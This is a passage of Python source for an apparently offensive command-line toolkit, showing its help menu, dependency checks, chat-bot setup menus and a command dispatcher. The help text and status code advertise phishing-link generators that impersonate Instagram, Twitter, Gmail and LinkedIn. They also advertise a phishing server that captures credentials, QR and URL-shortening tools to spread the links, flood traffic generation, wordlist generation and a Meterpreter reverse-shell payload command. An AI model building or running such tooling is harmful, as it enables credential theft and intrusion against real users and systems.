  generate_phishing_link_for_instagram    - Generate Instagram phishing link
  generate_phishing_link_for_twitter      - Generate Twitter phishing link
  generate_phishing_link_for_gmail        - Generate Gmail phishing link
  generate_phishing_link_for_linkedin     - Generate LinkedIn phishing link
  generate_phishing_link_for_custom [url] - Generate custom phishing link
  phishing_start_server <id> [port]       - Start phishing server
  phishing_stop_server                    - Stop phishing server
  phishing_status                         - Check server status
  phishing_links                          - List all phishing links
  phishing_credentials [id]                - View captured credentials
  phishing_qr <id>                        - Generate QR code
  phishing_shorten <id>                    - Shorten URL

{Colors.PRIMARY}🕷️ NIKTO WEB SCANNER:{Colors.RESET}
  nikto <target>              - Basic web vulnerability scan
  nikto_ssl <target>          - SSL/TLS specific scan
  nikto_sql <target>          - SQL injection scan
  nikto_xss <target>          - XSS scan
  nikto_cgi <target>          - CGI scan
  nikto_full <target>         - Full scan with all tests
  nikto_status                - Check Nikto availability
  nikto_results               - View recent scans

{Colors.PRIMARY}🔒 IP MANAGEMENT:{Colors.RESET}
  add_ip <ip> [notes]         - Add IP to monitoring
  remove_ip <ip>              - Remove IP from monitoring
  block_ip <ip> [reason]      - Block IP via firewall
  unblock_ip <ip>            - Unblock IP
  list_ips [all/active/blocked] - List managed IPs
  ip_info <ip>               - Detailed IP information

{Colors.PRIMARY}! METASPLOIT-STYLE COMMANDS:{Colors.RESET}
  !db_nmap <option> <target>    - Nmap scanning with all options
  !use <module>                - Select auxiliary module
  !set <option> <value>        - Set module option
  !run                         - Run selected module
  !show <options|modules|payloads> - Show information
  !hosts                       - List hosts
  !services -S <ip>            - List services
  !workspace                   - Manage workspaces
  !sessions                    - List active sessions
  !route                       - Show/manage routes
  !generate                    - Generate payloads

{Colors.PRIMARY}💡 CRUNCH EXAMPLES:{Colors.RESET}
  crunch_generate passwords 8 12 alphanum
  crunch_generate pins 4 6 numeric
  crunch_generate custom 5 10 mixed abcdef123456
  crunch_list
  crunch_info abc12345

{Colors.PRIMARY}💡 SSH EXAMPLES:{Colors.RESET}
  ssh_add webserver 192.168.1.100 root mypassword 22
  ssh_list
  ssh_connect webserver
  ssh_exec webserver "ls -la /var/www"
  ssh_upload webserver /local/file.txt /remote/file.txt
  ssh_disconnect webserver

{Colors.PRIMARY}🚀 TRAFFIC EXAMPLES:{Colors.RESET}
  generate_traffic icmp 192.168.1.1 10
  generate_traffic tcp_syn 10.0.0.5 30 80
  generate_traffic http_get 192.168.1.100 60 80 200

{Colors.PRIMARY}🎣 PHISHING EXAMPLES:{Colors.RESET}
  generate_phishing_link_for_facebook
  phishing_start_server abc12345 8080
  phishing_status
  phishing_credentials

{Colors.PRIMARY}! MODULE EXAMPLES:{Colors.RESET}
  !use auxiliary/scanner/ip/ipgeo
  !set RHOSTS 192.168.1.1
  !run
  !generate payload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 -f exe

{Colors.PRIMARY}└─────────────────────────────────────────────────────────────────────┘{Colors.RESET}
        """
        print(help_text)
    
    def check_dependencies(self):
        print(f"\n{Colors.PRIMARY}🔍 Checking dependencies...{Colors.RESET}")
        
        required_tools = ['ping', 'nmap', 'curl', 'dig', 'traceroute', 'ssh']
        missing = []
        
        for tool in required_tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️  {tool} not found{Colors.RESET}")
                missing.append(tool)
        
        if shutil.which('crunch'):
            print(f"{Colors.SUCCESS}✅ crunch (wordlist generator){Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  crunch not found - using fallback wordlist generation{Colors.RESET}")
        
        try:
            import paramiko
            print(f"{Colors.SUCCESS}✅ paramiko (SSH){Colors.RESET}")
        except ImportError:
            print(f"{Colors.WARNING}⚠️  paramiko not found - SSH features disabled{Colors.RESET}")
        
        if SCAPY_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ scapy (advanced traffic){Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  scapy not found - advanced traffic types disabled{Colors.RESET}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            print(f"{Colors.SUCCESS}✅ raw socket permission{Colors.RESET}")
        except PermissionError:
            print(f"{Colors.WARNING}⚠️  raw socket permission denied - run with sudo/admin{Colors.RESET}")
        
        if self.nikto.nikto_available:
            print(f"{Colors.SUCCESS}✅ nikto{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  nikto not found - web vulnerability scanning disabled{Colors.RESET}")
        
        if QRCODE_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ qrcode (QR generation){Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  qrcode not found - QR code generation disabled{Colors.RESET}")
        
        if SHORTENER_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ pyshorteners (URL shortening){Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  pyshorteners not found - URL shortening disabled{Colors.RESET}")
        
        if SELENIUM_AVAILABLE and WEBDRIVER_MANAGER_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ selenium (WhatsApp){Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  selenium not found - WhatsApp integration disabled{Colors.RESET}")
        
        if SIGNAL_CLI_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ signal-cli{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  signal-cli not found - Signal integration disabled{Colors.RESET}")
        
        if SLACK_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ slack-sdk{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  slack-sdk not found - Slack integration disabled{Colors.RESET}")
        
        if IMESSAGE_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ iMessage (macOS){Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  iMessage only available on macOS{Colors.RESET}")
        
        if missing:
            print(f"\n{Colors.WARNING}⚠️  Some tools are missing. Install with:{Colors.RESET}")
            if platform.system().lower() == 'linux':
                print(f"  sudo apt-get install {' '.join(missing)} crunch")
            elif platform.system().lower() == 'darwin':
                print(f"  brew install {' '.join(missing)} crunch")
        
        print(f"\n{Colors.SUCCESS}✅ Dependencies check complete{Colors.RESET}")
    
    def setup_crunch_config(self):
        print(f"\n{Colors.PRIMARY}🔐 Crunch Wordlist Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        current = self.config.get('crunch', {})
        print(f"Current settings:")
        print(f"  Max Wordlist Size: {current.get('max_wordlist_size_mb', 100)} MB")
        print(f"  Max Line Count: {current.get('max_line_count', 10000000)}")
        print()
        
        update = input(f"{Colors.ORANGE}Update settings? (y/n): {Colors.RESET}").strip().lower()
        if update == 'y':
            try:
                max_size = input(f"Max wordlist size in MB [{current.get('max_wordlist_size_mb', 100)}]: ").strip()
                if max_size:
                    self.config['crunch']['max_wordlist_size_mb'] = int(max_size)
                max_lines = input(f"Max line count [{current.get('max_line_count', 10000000)}]: ").strip()
                if max_lines:
                    self.config['crunch']['max_line_count'] = int(max_lines)
                ConfigManager.save_config(self.config)
                print(f"{Colors.SUCCESS}✅ Crunch configuration saved{Colors.RESET}")
            except ValueError as e:
                print(f"{Colors.ERROR}❌ Invalid input: {e}{Colors.RESET}")
    
    def setup_ssh_config(self):
        print(f"\n{Colors.PRIMARY}🔌 SSH Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        current = self.config.get('ssh', {})
        print(f"Current settings:")
        print(f"  Enabled: {'Yes' if current.get('enabled', True) else 'No'}")
        print(f"  Default Timeout: {current.get('default_timeout', 30)} seconds")
        print(f"  Max Connections: {current.get('max_connections', 5)}")
        print(f"  Keep Alive: {current.get('keep_alive', 60)} seconds")
        print(f"  Log Commands: {'Yes' if current.get('log_commands', True) else 'No'}")
        print()
        
        update = input(f"{Colors.ORANGE}Update settings? (y/n): {Colors.RESET}").strip().lower()
        if update == 'y':
            try:
                timeout = input(f"Default timeout [{current.get('default_timeout', 30)}]: ").strip()
                if timeout:
                    self.config['ssh']['default_timeout'] = int(timeout)
                max_conn = input(f"Max connections [{current.get('max_connections', 5)}]: ").strip()
                if max_conn:
                    self.config['ssh']['max_connections'] = int(max_conn)
                keep_alive = input(f"Keep alive seconds [{current.get('keep_alive', 60)}]: ").strip()
                if keep_alive:
                    self.config['ssh']['keep_alive'] = int(keep_alive)
                log_cmds = input(f"Log SSH commands? (y/n) [{current.get('log_commands', True)}]: ").strip().lower()
                if log_cmds == 'y':
                    self.config['ssh']['log_commands'] = True
                elif log_cmds == 'n':
                    self.config['ssh']['log_commands'] = False
                ConfigManager.save_config(self.config)
                print(f"{Colors.SUCCESS}✅ SSH configuration saved{Colors.RESET}")
            except ValueError as e:
                print(f"{Colors.ERROR}❌ Invalid input: {e}{Colors.RESET}")
    
    def setup_traffic_config(self):
        print(f"\n{Colors.PRIMARY}🚀 Traffic Generation Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        current = self.config.get('traffic_generation', {})
        print(f"Current settings:")
        print(f"  Max Duration: {current.get('max_duration', 300)} seconds")
        print(f"  Max Packet Rate: {current.get('max_packet_rate', 1000)} packets/second")
        print(f"  Allow Floods: {'Yes' if current.get('allow_floods', False) else 'No'}")
        print()
        
        update = input(f"{Colors.ORANGE}Update settings? (y/n): {Colors.RESET}").strip().lower()
        if update == 'y':
            try:
                max_duration = input(f"Max duration in seconds [{current.get('max_duration', 300)}]: ").strip()
                if max_duration:
                    self.config['traffic_generation']['max_duration'] = int(max_duration)
                max_rate = input(f"Max packet rate [{current.get('max_packet_rate', 1000)}]: ").strip()
                if max_rate:
                    self.config['traffic_generation']['max_packet_rate'] = int(max_rate)
                allow_floods = input(f"Allow flood traffic? (y/n) [{current.get('allow_floods', False)}]: ").strip().lower()
                if allow_floods == 'y':
                    self.config['traffic_generation']['allow_floods'] = True
                elif allow_floods == 'n':
                    self.config['traffic_generation']['allow_floods'] = False
                ConfigManager.save_config(self.config)
                print(f"{Colors.SUCCESS}✅ Traffic configuration saved{Colors.RESET}")
            except ValueError as e:
                print(f"{Colors.ERROR}❌ Invalid input: {e}{Colors.RESET}")
    
    def setup_social_engineering(self):
        print(f"\n{Colors.PRIMARY}🎣 Social Engineering Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        current = self.config.get('social_engineering', {})
        print(f"Current settings:")
        print(f"  Default Port: {current.get('default_port', 8080)}")
        print(f"  Capture Credentials: {'Yes' if current.get('capture_credentials', True) else 'No'}")
        print()
        
        update = input(f"{Colors.ORANGE}Update settings? (y/n): {Colors.RESET}").strip().lower()
        if update == 'y':
            try:
                port = input(f"Default port [{current.get('default_port', 8080)}]: ").strip()
                if port:
                    self.config['social_engineering']['default_port'] = int(port)
                capture = input(f"Capture credentials? (y/n) [{current.get('capture_credentials', True)}]: ").strip().lower()
                if capture == 'y':
                    self.config['social_engineering']['capture_credentials'] = True
                elif capture == 'n':
                    self.config['social_engineering']['capture_credentials'] = False
                ConfigManager.save_config(self.config)
                print(f"{Colors.SUCCESS}✅ Social engineering configuration saved{Colors.RESET}")
            except ValueError as e:
                print(f"{Colors.ERROR}❌ Invalid input: {e}{Colors.RESET}")
    
    def setup_discord(self):
        print(f"\n{Colors.PRIMARY}🤖 Discord Bot Setup{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        token = input(f"{Colors.ORANGE}Enter Discord bot token (or press Enter to skip): {Colors.RESET}").strip()
        if not token:
            print(f"{Colors.WARNING}⚠️  Discord setup skipped{Colors.RESET}")
            return
        
        channel_id = input(f"{Colors.ORANGE}Enter channel ID for notifications (optional): {Colors.RESET}").strip()
        prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or "!"
        admin_role = input(f"{Colors.ORANGE}Enter admin role name (default: Admin): {Colors.RESET}").strip() or "Admin"
        security_role = input(f"{Colors.ORANGE}Enter security team role name (default: Security Team): {Colors.RESET}").strip() or "Security Team"
        
        if self.discord_bot.save_config(token, channel_id, True, prefix, admin_role, security_role):
            print(f"{Colors.SUCCESS}✅ Discord configured!{Colors.RESET}")
            if self.discord_bot.start_bot_thread():
                print(f"{Colors.SUCCESS}✅ Discord bot started! Use '{prefix}help' in Discord{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Failed to start Discord bot{Colors.RESET}")
        else:
            print(f"{Colors.ERROR}❌ Failed to save Discord configuration{Colors.RESET}")
    
    def setup_telegram(self):
        print(f"\n{Colors.PRIMARY}📱 Telegram Bot Setup{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        use_bot = input(f"{Colors.ORANGE}Use bot token (recommended) or user account? (bot/user): {Colors.RESET}").strip().lower()
        
        if use_bot == 'bot':
            bot_token = input(f"{Colors.ORANGE}Enter bot token: {Colors.RESET}").strip()
            if not bot_token:
                print(f"{Colors.WARNING}⚠️  Telegram setup skipped{Colors.RESET}")
                return
            channel_id = input(f"{Colors.ORANGE}Enter channel ID (optional): {Colors.RESET}").strip()
            if self.telegram_bot.save_config(bot_token=bot_token, channel_id=channel_id, enabled=True):
                print(f"{Colors.SUCCESS}✅ Telegram configured!{Colors.RESET}")
                if self.telegram_bot.start_bot_thread():
                    print(f"{Colors.SUCCESS}✅ Telegram bot started! Use /help in Telegram{Colors.RESET}")
                else:
                    print(f"{Colors.ERROR}❌ Failed to start Telegram bot{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Failed to save Telegram configuration{Colors.RESET}")
        elif use_bot == 'user':
            api_id = input(f"{Colors.ORANGE}Enter API ID: {Colors.RESET}").strip()
            if not api_id:
                print(f"{Colors.WARNING}⚠️  Telegram setup skipped{Colors.RESET}")
                return
            api_hash = input(f"{Colors.ORANGE}Enter API Hash: {Colors.RESET}").strip()
            phone_number = input(f"{Colors.ORANGE}Enter your phone number (with country code): {Colors.RESET}").strip()
            channel_id = input(f"{Colors.ORANGE}Enter channel ID (optional): {Colors.RESET}").strip()
            if self.telegram_bot.save_config(api_id, api_hash, phone_number, channel_id, True):
                print(f"{Colors.SUCCESS}✅ Telegram configured!{Colors.RESET}")
                if self.telegram_bot.start_bot_thread():
                    print(f"{Colors.SUCCESS}✅ Telegram bot started! Use /help in Telegram{Colors.RESET}")
                else:
                    print(f"{Colors.ERROR}❌ Failed to start Telegram bot{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Failed to save Telegram configuration{Colors.RESET}")
    
    def setup_whatsapp(self):
        print(f"\n{Colors.PRIMARY}📱 WhatsApp Bot Setup{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        if not SELENIUM_AVAILABLE or not WEBDRIVER_MANAGER_AVAILABLE:
            print(f"{Colors.ERROR}❌ Selenium or webdriver-manager not installed{Colors.RESET}")
            print(f"{Colors.WARNING}Install with: pip install selenium webdriver-manager{Colors.RESET}")
            return
        
        phone = input(f"{Colors.ORANGE}Enter your WhatsApp phone number (with country code): {Colors.RESET}").strip()
        if not phone:
            print(f"{Colors.WARNING}⚠️  WhatsApp setup skipped{Colors.RESET}")
            return
        
        prefix = input(f"{Colors.ORANGE}Enter command prefix (default: /): {Colors.RESET}").strip() or "/"
        
        if self.whatsapp_bot.save_config(phone, True, prefix, False, []):
            print(f"{Colors.SUCCESS}✅ WhatsApp configured!{Colors.RESET}")
            print(f"{Colors.WARNING}📱 To start WhatsApp bot, use: start_whatsapp (you'll need to scan QR code){Colors.RESET}")
        else:
            print(f"{Colors.ERROR}❌ Failed to save WhatsApp configuration{Colors.RESET}")
    
    def setup_signal(self):
        print(f"\n{Colors.PRIMARY}🔐 Signal Bot Setup{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        if not SIGNAL_CLI_AVAILABLE:
            print(f"{Colors.ERROR}❌ signal-cli not found{Colors.RESET}")
            print(f"{Colors.WARNING}Please install signal-cli first{Colors.RESET}")
            return
        
        phone = input(f"{Colors.ORANGE}Enter your Signal phone number (with country code): {Colors.RESET}").strip()
        if not phone:
            print(f"{Colors.WARNING}⚠️  Signal setup skipped{Colors.RESET}")
            return
        
        prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or "!"
        
        if self.signal_bot.save_config(phone, True, prefix, "signal-cli", []):
            print(f"{Colors.SUCCESS}✅ Signal configured!{Colors.RESET}")
            print(f"{Colors.WARNING}🔐 Use: signal_register - to register device, then start_signal{Colors.RESET}")
        else:
            print(f"{Colors.ERROR}❌ Failed to save Signal configuration{Colors.RESET}")
    
    def setup_slack(self):
        print(f"\n{Colors.PRIMARY}💬 Slack Bot Setup{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        if not SLACK_AVAILABLE:
            print(f"{Colors.ERROR}❌ Slack SDK not installed{Colors.RESET}")
            print(f"{Colors.WARNING}Install with: pip install slack-sdk{Colors.RESET}")
            return
        
        bot_token = input(f"{Colors.ORANGE}Enter Slack Bot Token (starts with xoxb-): {Colors.RESET}").strip()
        if not bot_token:
            print(f"{Colors.WARNING}⚠️  Slack setup skipped{Colors.RESET}")
            return
        
        channel_id = input(f"{Colors.ORANGE}Enter default channel ID (optional): {Colors.RESET}").strip()
        prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or "!"
        
        if self.slack_bot.save_config(bot_token, "", channel_id, True, prefix, []):
            print(f"{Colors.SUCCESS}✅ Slack configured!{Colors.RESET}")
            print(f"{Colors.WARNING}💬 Use: start_slack - to start Slack bot{Colors.RESET}")
        else:
            print(f"{Colors.ERROR}❌ Failed to save Slack configuration{Colors.RESET}")
    
    def setup_imessage(self):
        print(f"\n{Colors.PRIMARY}💬 iMessage Bot Setup (macOS only){Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        if not IMESSAGE_AVAILABLE:
            print(f"{Colors.ERROR}❌ iMessage only available on macOS{Colors.RESET}")
            return
        
        numbers = input(f"{Colors.ORANGE}Enter phone numbers to monitor (space-separated): {Colors.RESET}").strip()
        number_list = numbers.split() if numbers else []
        prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or "!"
        
        if self.imessage_bot.save_config(number_list, True, prefix, []):
            print(f"{Colors.SUCCESS}✅ iMessage configured!{Colors.RESET}")
            print(f"{Colors.WARNING}💬 Use: start_imessage - to start iMessage bot{Colors.RESET}")
        else:
            print(f"{Colors.ERROR}❌ Failed to save iMessage configuration{Colors.RESET}")
    
    def process_command(self, command: str):
        if not command.strip():
            return
        
        self.db.update_session_activity(self.session_id)
        
        parts = command.strip().split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        if cmd == 'help':
            self.print_help()
        elif cmd == 'start':
            self.monitor.start_monitoring()
            print(f"{Colors.SUCCESS}✅ Threat monitoring started{Colors.RESET}")
        elif cmd == 'stop':
            self.monitor.stop_monitoring()
            print(f"{Colors.WARNING}🛑 Threat monitoring stopped{Colors.RESET}")
        elif cmd == 'start_whatsapp':
            if not self.whatsapp_bot.config.get('phone_number'):
                print(f"{Colors.ERROR}❌ WhatsApp not configured. Use 'whatsapp_config' first.{Colors.RESET}")
            else:
                if self.whatsapp_bot.start_bot_thread():
                    print(f"{Colors.SUCCESS}✅ WhatsApp bot starting... Check console for QR code.{Colors.RESET}")
                else:
                    print(f"{Colors.ERROR}❌ Failed to start WhatsApp bot{Colors.RESET}")
        elif cmd == 'start_signal':
            if not self.signal_bot.config.get('phone_number'):
                print(f"{Colors.ERROR}❌ Signal not configured. Use 'signal_config' first.{Colors.RESET}")
            else:
                if self.signal_bot.start_bot_thread():
                    print(f"{Colors.SUCCESS}✅ Signal bot starting...{Colors.RESET}")
                else:
                    print(f"{Colors.ERROR}❌ Failed to start Signal bot{Colors.RESET}")
        elif cmd == 'signal_register':
            if not self.signal_bot.config.get('phone_number'):
                print(f"{Colors.ERROR}❌ Signal not configured. Use 'signal_config' first.{Colors.RESET}")
            else:
                self.signal_bot.register_device()
        elif cmd == 'start_slack':
            if not self.slack_bot.config.get('bot_token'):
                print(f"{Colors.ERROR}❌ Slack not configured. Use 'slack_config' first.{Colors.RESET}")
            else:
                if self.slack_bot.start_bot_thread():
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
                else:
                    print(f"{Colors.ERROR}❌ Failed to start Slack bot{Colors.RESET}")
        elif cmd == 'start_imessage':
            if not IMESSAGE_AVAILABLE:
                print(f"{Colors.ERROR}❌ iMessage only available on macOS{Colors.RESET}")
            elif not self.imessage_bot.config.get('phone_numbers'):
                print(f"{Colors.ERROR}❌ iMessage not configured. Use 'imessage_config' first.{Colors.RESET}")
            else:
                if self.imessage_bot.start_bot_thread():
                    print(f"{Colors.SUCCESS}✅ iMessage bot starting...{Colors.RESET}")
                else:
                    print(f"{Colors.ERROR}❌ Failed to start iMessage bot{Colors.RESET}")
        elif cmd == 'start_discord':
            if not self.discord_bot.config.get('token'):
                print(f"{Colors.ERROR}❌ Discord token not configured{Colors.RESET}")
            else:
                if self.discord_bot.start_bot_thread():
                    print(f"{Colors.SUCCESS}✅ Discord bot started!{Colors.RESET}")
                else:
                    print(f"{Colors.ERROR}❌ Failed to start Discord bot{Colors.RESET}")
        elif cmd == 'start_telegram':
            if not self.telegram_bot.config.get('bot_token') and not self.telegram_bot.config.get('api_id'):
                print(f"{Colors.ERROR}❌ Telegram not configured. Use setup menu.{Colors.RESET}")
            else:
                if self.telegram_bot.start_bot_thread():
                    print(f"{Colors.SUCCESS}✅ Telegram bot started!{Colors.RESET}")
                else:
                    print(f"{Colors.ERROR}❌ Failed to start Telegram bot{Colors.RESET}")
        elif cmd == 'status':
            status = self.monitor.get_status()
            sessions = self.db.get_sessions()
            stats = self.db.get_statistics()
            ssh_status = self.ssh_manager.get_status()
            
            print(f"\n{Colors.PRIMARY}📊 System Status:{Colors.RESET}")
            print(f"  Session ID: {self.session_id}")
            print(f"  Active Sessions: {len([s for s in sessions if s.get('active')])}")
            print(f"  Total Commands: {stats.get('total_commands', 0)}")
            print(f"  Time Commands: {stats.get('total_time_commands', 0)}")
            print(f"  Crunch Wordlists: {stats.get('total_crunch_wordlists', 0)}")
            
            print(f"\n{Colors.PRIMARY}🔌 SSH Status:{Colors.RESET}")
            print(f"  Active Connections: {ssh_status.get('total_connections', 0)}")
            print(f"  Max Connections: {ssh_status.get('max_connections', 5)}")
            print(f"  Configured Servers: {stats.get('total_ssh_servers', 0)}")
            print(f"  Total SSH Commands: {stats.get('total_ssh_commands', 0)}")
            
            print(f"\n{Colors.PRIMARY}📊 Monitoring Status:{Colors.RESET}")
            print(f"  Active: {'✅ Yes' if status['monitoring'] else '❌ No'}")
            print(f"  Monitored IPs: {status['monitored_ips_count']}")
            print(f"  Blocked IPs: {status.get('blocked_ips', 0)}")
            print(f"  Auto-block: {'✅ Enabled' if status.get('auto_block') else '❌ Disabled'}")
            
            print(f"\n{Colors.PRIMARY}🤖 Bot Status:{Colors.RESET}")
            print(f"  Discord: {'✅ Active' if self.discord_bot.running else '❌ Inactive'}")
            print(f"  Telegram: {'✅ Active' if self.telegram_bot.running else '❌ Inactive'}")
            print(f"  WhatsApp: {'✅ Active' if self.whatsapp_bot.running else '❌ Inactive'}")
            print(f"  Signal: {'✅ Active' if self.signal_bot.running else '❌ Inactive'}")
            print(f"  Slack: {'✅ Active' if self.slack_bot.running else '❌ Inactive'}")
            print(f"  iMessage: {'✅ Active' if self.imessage_bot.running else '❌ Inactive'}")
            
            traffic_status = self.traffic_gen.get_active_generators()
            print(f"\n{Colors.PRIMARY}🚀 Traffic Generation:{Colors.RESET}")
            print(f"  Active Generators: {len(traffic_status)}")
            for gen in traffic_status[:3]:
                print(f"    • {gen['target_ip']} - {gen['traffic_type']} ({gen['packets_sent']} packets)")
            
            if self.handler.social_tools.phishing_server.running:
                print(f"\n{Colors.PRIMARY}🎣 Phishing Server:{Colors.RESET}")
                print(f"  Status: ✅ Running")
                print(f"  URL: {self.handler.social_tools.get_server_url()}")
                print(f"  Link ID: {self.handler.social_tools.phishing_server.link_id}")
                print(f"  Platform: {self.handler.social_tools.phishing_server.platform}")
            
            wordlists = self.crunch_gen.get_wordlists()
            if wordlists:
                print(f"\n{Colors.PRIMARY}🔐 Recent Wordlists:{Colors.RESET}")
                for wl in wordlists[:3]:
                    size_mb = wl['file_size'] / (1024 * 1024)
                    print(f"    • {wl['name']} - {wl['min_length']}-{wl['max_length']} chars, {wl['line_count']:,} lines ({size_mb:.2f} MB)")
            
            threats = self.db.get_recent_threats(3)
            if threats:
                print(f"\n{Colors.ERROR}🚨 Recent Threats:{Colors.RESET}")
                for threat in threats:
                    severity_color = Colors.ERROR if threat['severity'] in ['critical', 'high'] else Colors.WARNING
                    print(f"  {severity_color}{threat['threat_type']} from {threat['source_ip']}{Colors.RESET}")
        elif cmd == 'threats':
            threats = self.db.get_recent_threats(10)
            if threats:
                print(f"\n{Colors.ERROR}🚨 Recent Threats:{Colors.RESET}")
                for threat in threats:
                    severity_color = Colors.ERROR if threat['severity'] in ['critical', 'high'] else Colors.WARNING
                    print(f"\n{severity_color}[{threat['timestamp'][:19]}] {threat['threat_type']}{Colors.RESET}")
                    print(f"  Source: {threat['source_ip']}")
                    print(f"  Severity: {threat['severity'].upper()}")
                    print(f"  Description: {threat['description']}")
            else:
                print(f"{Colors.SUCCESS}✅ No recent threats detected{Colors.RESET}")
        elif cmd == 'history':
            history = self.db.get_command_history(20)
            if history:
                print(f"\n{Colors.PRIMARY}📜 Command History:{Colors.RESET}")
                for record in history:
                    status = f"{Colors.SUCCESS}✅" if record['success'] else f"{Colors.ERROR}❌"
                    print(f"{status} [{record['source']}] {record['command'][:50]}{Colors.RESET}")
                    print(f"     {record['timestamp'][:19]}")
            else:
                print(f"{Colors.WARNING}📜 No command history{Colors.RESET}")
        elif cmd == 'time_history':
            history = self.db.get_time_history(10)
            if history:
                print(f"\n{Colors.PRIMARY}⏰ Time Command History:{Colors.RESET}")
                for record in history:
                    print(f"  [{record['timestamp'][:19]}] {record['command']} - {record['result'][:50]}")
            else:
                print(f"{Colors.WARNING}⏰ No time command history{Colors.RESET}")
        elif cmd == 'report':
            result = self.handler.execute("report")
            if result['success']:
                data = result['data']
                print(f"\n{Colors.PRIMARY}📊 Security Report{Colors.RESET}")
                print(f"{Colors.PRIMARY}{'='*60}{Colors.RESET}")
                print(f"\n{Colors.SECONDARY}Generated: {data.get('generated_at', '')[:19]}{Colors.RESET}")
                
                stats = data.get('statistics', {})
                print(f"\n{Colors.SECONDARY}📈 Statistics:{Colors.RESET}")
                print(f"  Total Commands: {stats.get('total_commands', 0)}")
                print(f"  Total Time Commands: {stats.get('total_time_commands', 0)}")
                print(f"  Total Scans: {stats.get('total_scans', 0)}")
                print(f"  Nikto Scans: {stats.get('total_nikto_scans', 0)}")
                print(f"  SSH Servers: {stats.get('total_ssh_servers', 0)}")
                print(f"  SSH Commands: {stats.get('total_ssh_commands', 0)}")
                print(f"  Traffic Tests: {stats.get('total_traffic_tests', 0)}")
                print(f"  Managed IPs: {stats.get('total_managed_ips', 0)}")
                print(f"  Blocked IPs: {stats.get('total_blocked_ips', 0)}")
                print(f"  Crunch Wordlists: {stats.get('total_crunch_wordlists', 0)}")
                print(f"  Total Threats: {stats.get('total_threats', 0)}")
                print(f"  Active Sessions: {stats.get('active_sessions', 0)}")
                
                threats = data.get('threat_summary', {})
                print(f"\n{Colors.ERROR}🚨 Threat Summary:{Colors.RESET}")
                print(f"  Critical: {threats.get('critical', 0)}")
                print(f"  High: {threats.get('high', 0)}")
                print(f"  Medium: {threats.get('medium', 0)}")
                print(f"  Low: {threats.get('low', 0)}")
                
                se = data.get('social_engineering', {})
                print(f"\n{Colors.PRIMARY}🎣 Social Engineering:{Colors.RESET}")
                print(f"  Active Phishing Links: {se.get('active_links', 0)}")
                print(f"  Total Phishing Links: {se.get('total_phishing_links', 0)}")
                print(f"  Captured Credentials: {se.get('total_captured_credentials', 0)}")
                
                crunch = data.get('crunch_wordlists', {})
                if crunch.get('total', 0) > 0:
                    print(f"\n{Colors.PRIMARY}🔐 Crunch Wordlists:{Colors.RESET}")
                    print(f"  Total Wordlists: {crunch.get('total', 0)}")
                    for wl in crunch.get('recent', [])[:3]:
                        size_mb = wl.get('file_size', 0) / (1024 * 1024)
                        print(f"    • {wl.get('name', 'Unknown')}: {wl.get('line_count', 0):,} lines ({size_mb:.2f} MB)")
                
                system = data.get('system_status', {})
                print(f"\n{Colors.SECONDARY}💻 System Status:{Colors.RESET}")
                print(f"  CPU: {system.get('cpu', 0)}%")
                print(f"  Memory: {system.get('memory', 0)}%")
                print(f"  Disk: {system.get('disk', 0)}%")
                
                ssh_activity = data.get('ssh_activity', {})
                if ssh_activity.get('total_commands', 0) > 0:
                    print(f"\n{Colors.PRIMARY}🔌 Recent SSH Commands:{Colors.RESET}")
                    for cmd in ssh_activity.get('recent_commands', [])[:3]:
                        status = "✅" if cmd.get('success') else "❌"
                        print(f"  {status} {cmd.get('command', '')[:50]}...")
                
                recommendations = data.get('recommendations', [])
                if recommendations:
                    print(f"\n{Colors.ORANGE}💡 Recommendations:{Colors.RESET}")
                    for rec in recommendations:
                        print(f"  • {rec}")
                
                if 'report_file' in data:
                    print(f"\n{Colors.SUCCESS}✅ Report saved: {data['report_file']}{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Failed to generate report: {result.get('output', 'Unknown error')}{Colors.RESET}")
        elif cmd == 'clear':
